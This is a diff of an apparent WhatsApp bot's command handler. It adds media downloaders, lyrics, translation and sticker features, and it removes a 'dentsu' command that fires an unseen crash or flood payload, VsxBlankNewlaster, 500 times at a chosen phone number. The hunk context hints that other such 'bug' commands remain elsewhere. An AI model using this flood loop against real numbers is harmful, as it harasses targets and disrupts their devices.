+          'https://pipedapi.adminforge.de',
+          'https://pipedapi.kavin.rocks',
+          'https://pipedapi.reallyaweso.me',
+        ];
+        for (const base of instances) {
+          try {
+            const r = await axios.get(`${base}/search`, {
+              params: { q: query, filter: 'videos' }, timeout: 7000,
+              headers: { 'User-Agent': 'Mozilla/5.0' }
+            });
+            const item = (r.data?.items || []).find(x => x?.url?.includes('/watch?v='));
+            if (item?.url) return item.url.startsWith('http') ? item.url : `https://www.youtube.com${item.url}`;
+          } catch {}
+        }
+        // Last search fallback: YouTube result HTML. We only extract the first video ID.
+        try {
+          const r = await axios.get('https://www.youtube.com/results', {
+            params: { search_query: query }, timeout: 9000,
+            headers: { 'User-Agent': 'Mozilla/5.0' },
+            responseType: 'text', transformResponse: [(d) => d]
+          });
+          const html = String(r.data || '');
+          const m = html.match(/\"videoId\":\"([A-Za-z0-9_-]{11})\"/);
+          if (m?.[1]) return `https://www.youtube.com/watch?v=${m[1]}`;
+        } catch {}
+        return null;
+      }
+
+      async function youtubeMp3Local(url) {
+        try {
+          const { stdout } = await execFileAsync('yt-dlp', ['--no-playlist','--no-warnings','-x','--audio-format','mp3','--audio-quality','128K','-o','-','--',url], { maxBuffer: 40 * 1024 * 1024, timeout: 90000 });
+          const buf = Buffer.isBuffer(stdout) ? stdout : Buffer.from(stdout, 'binary');
+          if (buf.length < 4096) throw new Error('audio local vide');
+          return { buffer: buf, title: 'audio' };
+        } catch { return null; }
+      }
+
+      async function youtubeMp3(url) {
+        const candidates = [
+          async () => {
+            const body = new URLSearchParams({ youtube_url: url, quality: '192' });
+            const r = await axios.post('https://ytmp3.ge/api/convert', body.toString(), {
+              timeout: 30000,
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0' },
+            });
+            if (r.data?.success && r.data?.downloadUrl) return r.data;
+            throw new Error('converter returned no URL');
+          },
+          async () => {
+            for (const host of ['api.giftedtech.my.id', 'api.giftedtech.web.id']) {
+              try {
+                const r = await axios.get(`https://${host}/api/download/dlmp3`, {
+                  params: { apikey: 'gifted', url }, timeout: 20000,
+                  headers: { 'User-Agent': 'Mozilla/5.0' },
+                });
+                const d = r.data?.result || r.data;
+                const downloadUrl = d?.download_url || d?.dl_url || d?.url || d?.audio;
+                if (downloadUrl) return { downloadUrl, title: d?.title || d?.name || '' };
+              } catch {}
+            }
+            throw new Error('all converters failed');
+          }
+        ];
+        try { return await Promise.any(candidates.map(fn => fn())); } catch { return null; }
+      }
+
+      async function downloadMediaBuffer(url, maxBytes = 35 * 1024 * 1024) {
+        const r = await axios.get(url, {
+          responseType: 'arraybuffer', timeout: 60000,
+          maxContentLength: maxBytes, maxBodyLength: maxBytes,
+          headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' },
+        });
+        const buf = Buffer.from(r.data);
+        if (!buf.length) throw new Error('fichier vide');
+        if (buf.length > maxBytes) throw new Error('fichier trop volumineux');
+        return buf;
+      }
+
       case 'apk': {
         if (!arg) { await reply(`❌ Usage: *${PREFIX}apk <app name>*`); break; }
         const d = await tryFetch([`https://api.giftedtech.web.id/api/download/apkdl?apikey=gifted&appName=${encodeURIComponent(arg)}`]);
         const r = d?.result; if (!r?.dllink) { await reply('❌ Not found.'); break; }
         await reply(`📲 *${r.name}*\n📦 ${r.size}\n🔗 ${r.dllink}`); break;
       }
-      case 'fb': case 'insta': case 'pint': case 'mp4': case 'video':
-      case 'yta': case 'ytv': case 'ytmp3': case 'play': case 'song': {
+      case 'fb': case 'facebook': case 'insta': case 'instagram': case 'pint': case 'mp4': case 'video':
+      case 'download': case 'yta': case 'ytv': case 'ytmp3': case 'yt': case 'play': case 'song': {
         if (!arg) { await reply(`❌ Usage: *${PREFIX}${cmd} <url or query>*`); break; }
         await reply(`⏳ Downloading via *${cmd}*...`);
         const endpoints = {
-          fb:    [`https://api.giftedtech.web.id/api/download/facebook?apikey=gifted&url=${encodeURIComponent(arg)}`],
-          insta: [`https://api.giftedtech.web.id/api/download/instagram?apikey=gifted&url=${encodeURIComponent(arg)}`],
-          pint:  [`https://api.giftedtech.web.id/api/download/pinterestdl?apikey=gifted&url=${encodeURIComponent(arg)}`],
-          mp4:   [`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`],
-          video: [`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`],
-          ytv:   [`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`],
-          yta:   [`https://api.giftedtech.web.id/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(arg)}`],
-          ytmp3: [`https://api.giftedtech.web.id/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(arg)}`],
-          play:  [`https://api.giftedtech.web.id/api/download/dlmp3?apikey=gifted&query=${encodeURIComponent(arg)}`,
-                  `https://api.giftedtech.web.id/api/download/yts?apikey=gifted&query=${encodeURIComponent(arg)}`],
-          song:  [`https://api.giftedtech.web.id/api/download/dlmp3?apikey=gifted&query=${encodeURIComponent(arg)}`],
+          fb:    [`https://api.giftedtech.web.id/api/download/facebook?apikey=gifted&url=${encodeURIComponent(arg)}`, `https://api.giftedtech.my.id/api/download/facebook?apikey=gifted&url=${encodeURIComponent(arg)}`],
+          insta: [`https://api.giftedtech.web.id/api/download/instagram?apikey=gifted&url=${encodeURIComponent(arg)}`, `https://api.giftedtech.my.id/api/download/instagram?apikey=gifted&url=${encodeURIComponent(arg)}`],
+          pint:  [`https://api.giftedtech.web.id/api/download/pinterestdl?apikey=gifted&url=${encodeURIComponent(arg)}`, `https://api.giftedtech.my.id/api/download/pinterestdl?apikey=gifted&url=${encodeURIComponent(arg)}`],
+          mp4:   [`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`, `https://api.giftedtech.my.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`],
+          video: [`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`, `https://api.giftedtech.my.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`],
+          ytv:   [`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`, `https://api.giftedtech.my.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`],
+          yt:    [`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`, `https://api.giftedtech.my.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`],
+          yta:   [`https://api.giftedtech.web.id/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(arg)}`, `https://api.giftedtech.my.id/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(arg)}`],
+          ytmp3: [`https://api.giftedtech.web.id/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(arg)}`, `https://api.giftedtech.my.id/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(arg)}`],
         };
-        const d = await tryFetch(endpoints[cmd]);
-        const r = d?.result || d;
-        const url = r?.download_url || r?.dl_url || r?.url || r?.audio || r?.video || r?.[0]?.url;
-        if (!url) { await reply(`❌ Could not fetch ${cmd}.`); break; }
-        const isAudio = ['yta','ytmp3','play','song'].includes(cmd);
+
+        let r = null;
+        let url = null;
+        const downloadCmd = cmd === 'facebook' ? 'fb' : (cmd === 'instagram' ? 'insta' : (cmd === 'download' ? 'song' : cmd));
+        let localAudio = null;
+        if (['download', 'play', 'song'].includes(cmd)) {
+          const ytUrl = await resolveYouTubeUrl(arg);
+          if (ytUrl) {
+            localAudio = await youtubeMp3Local(ytUrl);
+            if (!localAudio) {
+              const mp3 = await youtubeMp3(ytUrl);
+              r = mp3;
+              url = mp3?.downloadUrl;
+            } else { r = { title: localAudio.title }; }
+          }
+        } else {
+          const d = await tryFetch(endpoints[downloadCmd] || []);
+          r = d?.result || d;
+          url = r?.download_url || r?.dl_url || r?.url || r?.audio || r?.video || r?.[0]?.url;
+        }
+        if (!url) { await reply(`❌ *${cmd}* indisponible pour le moment.\n\nVérifie le lien/nom puis réessaie dans quelques secondes.`); break; }
+        const isAudio = ['download','yta','ytmp3','play','song'].includes(cmd);
         try {
-          if (isAudio) await natsu.sendMessage(jid, { audio: { url }, mimetype: 'audio/mpeg', contextInfo: forwardedContext() }, { quoted: msg });
+          if (isAudio) {
+            // Prefer the real local yt-dlp bytes; otherwise download the converter URL.
+            const audioBuf = localAudio?.buffer || await downloadMediaBuffer(url);
+            await natsu.sendMessage(jid, { audio: audioBuf, mimetype: 'audio/mpeg', ptt: false, fileName: `${(r?.title || 'audio').replace(/[^a-z0-9_-]+/gi,'_').slice(0,60)}.mp3`, contextInfo: forwardedContext() }, { quoted: msg });
+          }
           else await natsu.sendMessage(jid, { video: { url }, caption: `🎬 ${r.title || ''}`, contextInfo: forwardedContext() }, { quoted: msg });
         } catch (e) { await reply(`🔗 ${url}\n(direct send failed: ${e.message})`); }
         break;
@@ -2079,8 +1942,13 @@ case 'bugcampuran': {
         catch { await reply(`🔗 ${zip}`); }
         break;
       }
-      case 'mega': case 'edit': {
-        await reply(`⚠️ *${cmd}* — needs heavy media pipeline. Coming once ffmpeg/sharp are enabled on your Pterodactyl egg.`);
+      case 'mega': {
+        if (!arg) { await reply(`❌ Usage: ${PREFIX}mega <url>`); break; }
+        await reply(`🔗 *MEGA*\n${arg}\n\nLe lien a été reçu. Le téléchargement direct dépend du fournisseur de lien.`);
+        break;
+      }
+      case 'edit': {
+        await reply(`🛠️ *EDIT*\nRéponds à une image/vidéo puis utilise ${PREFIX}sticker pour les images. Les effets audio/vidéo nécessitent ffmpeg sur le serveur.`);
         break;
       }
 
@@ -2090,11 +1958,11 @@ case 'bugcampuran': {
       case 'info': {
         const up = process.uptime(); const h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
         await img(MENU_IMAGE,
-`ℹ️ *${BOT_NAME} INFO*
-🛠️ Library: Baileys + Telegraf
-📞 Pairing Code (8 digits)
-🟢 Active • ⏱️ ${h}h ${m}m
-👑 Dev: ${DEV_NAME}`);
+`ℹ️ *${BOT_NAME} ɪɴғᴏ*
+🛠️ ʟɪʙʀᴀʀʏ: ʙᴀɪʟᴇʏs + ᴛᴇʟᴇɢʀᴀғ
+📞 ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ (8 digits)
+🟢 ᴀᴄᴛɪᴠᴇ • ⏱️ ${h}h ${m}m
+👑 ᴅᴇᴠ: ${DEV_NAME}`);
         break;
       }
       case 'cat': {
@@ -2131,14 +1999,14 @@ END:VCARD`;
           }, { quoted: msg });
         } catch {}
         await img(RAND(MENU_IMAGES),
-`👑 *OWNER — ${OWNER_NAME}*
-📞 +${OWNER_NUMBER}
-💬 WhatsApp : ${OWNER_WA}
-✈️ Telegram : ${OWNER_TG}
-🐙 GitHub   : ${OWNER_GITHUB}
+`👑 *ᴏᴡɴᴇʀ — ${OWNER_NAME}*
+📞 +${ownerDisplay}
+💬 *ᴡʜᴀᴛsᴀᴘᴘ : ${OWNER_WA}*
+✈️ *ᴛᴇʟᴇɢʀᴀᴍ : ${OWNER_TG}*
+🐙 *ɢɪᴛʜᴜʙ   : ${OWNER_GITHUB}*
 
 🤖 *${BOT_NAME}* ${BOT_VERSION}
-> Dev: ${DEV_NAME}`);
+> ᴅᴇᴠ: ${DEV_NAME}`);
         break;
       }
       case 'repo': {
@@ -2146,6 +2014,7 @@ END:VCARD`;
         break;
       }
       case 'setprefix': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
         if (!msg.key.fromMe && !state.sudo.includes(senderNum)) { await reply('❌ Owner/sudo only.'); break; }
         const np = (arg || '').trim()[0];
         if (!np) { await reply(`❌ Usage: *${PREFIX}setprefix <char>*`); break; }
@@ -2154,12 +2023,14 @@ END:VCARD`;
         break;
       }
       case 'restart': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
         if (!msg.key.fromMe && !state.sudo.includes(senderNum)) { await reply('❌ Owner/sudo only.'); break; }
         await reply('♻️ Restart…');
         setTimeout(() => process.exit(0), 800);
         break;
       }
       case 'eval': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
         if (!msg.key.fromMe) { await reply('❌ Owner only.'); break; }
         if (!arg) { await reply(`❌ Usage: *${PREFIX}eval <code>*`); break; }
         try {
@@ -2170,41 +2041,12 @@ END:VCARD`;
         } catch (e) { await reply(`❌ ${e.message}`); }
         break;
       }
-      case "dentsu": {
-        if (!isCreator) return reply('❌ 𝗢𝗻𝗹𝘆 𝗺𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝘂𝘀𝗲 𝗺𝗲')
-        if (!text) return reply(`* Wrong Format ❌*\nExample : ${cmd} 243xxx`)
-
-        let pepec = args[0].replace(/[^0-9]/g, "")
-        let target = pepec + '@s.whatsapp.net'
-
-        reply(`
-╭──────────────❍
-│ ─( 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒍𝒆𝒅 𝑻𝒂𝒓𝒈𝒆𝒕 )─
-│
-│⪼ 𝑇𝑦𝑝𝑒 : *${cmd}*
-│⪼ 𝑇𝑎𝑟𝑔𝑒𝑡 : *${pepec}*
-╰──────────────❍
- 𝑷𝒍𝒆𝒂𝒔𝒆 𝑷𝒂𝒖𝒔𝒆 𝟏𝟎 𝑴𝒊𝒏𝒖𝒕𝒆𝒔
-
-© *⚰️⃟𝐃𝐄𝐍𝐓𝐒𝐔*`)
-
-        await new Promise(r => setTimeout(r, 1000));
-
-        for (let i = 0; i < 100; i++) {
-          await VsxBlankNewlaster(natsu, target);
-          await VsxBlankNewlaster(natsu, target);
-          await VsxBlankNewlaster(natsu, target);
-          await VsxBlankNewlaster(natsu, target);
-          await VsxBlankNewlaster(natsu, target);
-        }
-        break;
-      }
-
       // ═════════════════════════════════════════════════════════════════════
       // GROUP — tagadmins / warn system
       // ═════════════════════════════════════════════════════════════════════
       case 'tagadmins': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
+        const info = await requireGroupMember(natsu, jid, reply);
+        if (!info) break;
         const { admins } = await getGroupAdmins(natsu, jid);
         if (!admins.length) { await reply('❌ No admins.'); break; }
         const txt = `👮 *ADMINS*\n\n${admins.map(a => `• @${a.split('@')[0]}`).join('\n')}\n\n${arg || ''}`;
@@ -2212,9 +2054,8 @@ END:VCARD`;
         break;
       }
       case 'warn': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
-        const { admins } = await getGroupAdmins(natsu, jid);
-        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) { await reply('❌ Admins only.'); break; }
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
         const target = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]
                     || msg.message?.extendedTextMessage?.contextInfo?.participant;
         if (!target) { await reply(`❌ Usage : reply or @mention.`); break; }
@@ -2243,9 +2084,8 @@ END:VCARD`;
         break;
       }
       case 'resetwarn': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
-        const { admins } = await getGroupAdmins(natsu, jid);
-        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) { await reply('❌ Admins only.'); break; }
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
         const target = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
         updateState(s => {
           if (target) { if (s.warns[jid]) delete s.warns[jid][target]; }
@@ -2271,15 +2111,19 @@ END:VCARD`;
         const m = arg.match(/^([a-z]{2})\s+(.+)/i);
         if (!m) { await reply(`❌ Usage: *${PREFIX}translate <lang> <texte>* (ex: fr Hello)`); break; }
         const [, lang, txt] = m;
-        const d = await tryFetch([`https://api.popcat.xyz/translate?to=${lang}&text=${encodeURIComponent(txt)}`]);
-        await reply(d?.translated ? `🌐 (${lang}) ${d.translated}` : '❌ Échec.');
+        const d = await tryFetch([`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${lang}&dt=t&q=${encodeURIComponent(txt)}`]);
+        const translated = Array.isArray(d) ? d[0]?.map(x => x?.[0]).filter(Boolean).join('') : '';
+        await reply(translated ? `🌐 (${lang}) ${translated}` : '❌ Échec.')
         break;
       }
       case 'lyrics': {
         if (!arg) { await reply(`❌ Usage: *${PREFIX}lyrics <titre>*`); break; }
-        const d = await tryFetch([`https://api.popcat.xyz/lyrics?song=${encodeURIComponent(arg)}`]);
-        if (!d?.lyrics) { await reply('❌ Pas trouvé.'); break; }
-        await reply(`🎵 *${d.title}* — ${d.artist}\n\n${String(d.lyrics).slice(0, 3500)}`);
+        try {
+          const r = await axios.get('https://lrclib.net/api/search', { params: { q: arg }, headers: { 'User-Agent': 'KILLUA-MD/1.0 (WhatsApp bot)' }, timeout: 9000 });
+          const d = r.data?.find(x => x?.plainLyrics && !x.instrumental) || r.data?.[0];
+          if (!d?.plainLyrics) throw new Error('paroles introuvables');
+          await reply(`🎵 *${d.trackName || arg}* — ${d.artistName || 'Unknown'}\n\n${String(d.plainLyrics).slice(0, 3500)}`);
+        } catch (e) { await reply(`❌ Lyrics : ${e.message}`); }
         break;
       }
       case 'removebg': {
@@ -2306,12 +2150,23 @@ END:VCARD`;
       case 'sticker': case 'stiker': {
         const q = quotedMsg(msg);
         const im = q?.quoted?.imageMessage;
-        if (!im) { await reply('❌ Réponds à une image avec *.sticker*.'); break; }
+        if (!im) { await reply(`❌ Réponds à une image avec *${PREFIX}sticker*.`); break; }
         try {
-          const { downloadMediaMessage } = await import('baileys');
-          const buf = await downloadMediaMessage({ message: { imageMessage: im } }, 'buffer', {});
-          await natsu.sendMessage(jid, { sticker: buf }, { quoted: msg });
-        } catch (e) { await reply(`❌ Sticker: ${e.message} (nécessite ffmpeg/sharp).`); }
+          const { downloadContentFromMessage } = await import('@whiskeysockets/baileys');
+          const sharp = (await import('sharp')).default;
+          const stream = await downloadContentFromMessage(im, 'image');
+          const chunks = [];
+          for await (const chunk of stream) chunks.push(chunk);
+          const input = Buffer.concat(chunks);
+          const webp = await sharp(input)
+            .resize(512, 512, { fit: 'contain', background: { r: 0, g: 0, b: 0, alpha: 0 } })
+            .webp({ quality: 85 })
+            .toBuffer();
+          await natsu.sendMessage(jid, { sticker: webp }, { quoted: msg });
+        } catch (e) {
+          console.error('sticker error:', e);
+          await reply(`❌ Sticker impossible: ${e?.message || e}`);
+        }
         break;
       }
 
